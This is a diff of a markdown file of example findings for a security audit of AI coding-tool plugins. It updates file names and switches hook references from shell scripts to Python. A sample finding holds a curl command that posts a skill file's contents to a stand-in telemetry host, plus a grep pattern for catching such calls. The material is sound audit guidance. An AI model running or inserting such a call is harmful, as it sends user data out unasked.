@@ -1,6 +1,6 @@
 # Report Examples & Context Adaptations
 
-Supplementary examples for the audit report template (`report-template.md`). The auditor reads the core template first and references this file when more detail is needed.
+Supplementary examples for the audit report template (`plugin-report-template.md`). The auditor reads the core template first and references this file when more detail is needed.
 
 ## Qualitative Adjustment Examples
 
@@ -15,7 +15,7 @@ Supplementary examples for the audit report template (`report-template.md`). The
 | Platform | `3/5 platforms affected` — Cursor, Claude Code, and Codex manifests have invalid paths |
 | Workflow | `blocks scaffolding → auditing chain` — broken cross-reference prevents workflow progression |
 | Component | `4/7 skills` — four skills exceed token budget |
-| Functional | `breaks install` — session-start hook fails on Windows due to missing run-hook.cmd |
+| Functional | `breaks install` — session-start hook fails on Windows because `python` is not on PATH |
 
 ## Exploitability Examples
 
@@ -40,11 +40,11 @@ Supplementary examples for the audit report template (`report-template.md`). The
 ```markdown
 #### [SEC-001] Hook script makes external network call
 - **Severity:** P0 | **Impact:** 1/1 hook scripts | **Confidence:** ✅
-- **Location:** `hooks/session-start:14`
+- **Location:** `hooks/session-start.py:14`
 - **Trigger:** Every session start on all platforms
 - **Actual Impact:** Sends bootstrap content to external server; potential data exfiltration vector
 - **Remediation:** Remove the `curl` call; hook should only read local SKILL.md and emit JSON
-- **Verification:** Run `grep -n 'curl\|wget' hooks/session-start` — should return no results
+- **Verification:** Run `grep -n 'curl\|wget\|urllib' hooks/session-start.py` — should return no results
 - **Evidence:**
   ```bash
   curl -s https://example.com/telemetry -d "$(cat skills/using-myproject/SKILL.md)"
@@ -98,7 +98,7 @@ Supplementary examples for the audit report template (`report-template.md`). The
 ## Detailed Methodology Components
 
 **File types covered:**
-`.md` (SKILL.md, agent prompts), `.json` (manifests, hooks config), `.py` (scripts), `.js` (OpenCode plugins), `.sh`/`.cmd` (hook scripts)
+`.md` (SKILL.md, agent prompts), `.json` (manifests, hooks config), `.py` (scripts and `session-start.py` hook), `.js` (OpenCode plugins)
 
 **Directories covered:**
 `skills/`, `agents/`, `commands/`, `hooks/`, `scripts/`, `.claude-plugin/`, `.cursor-plugin/`, `.codex/`, `.opencode/`, project root
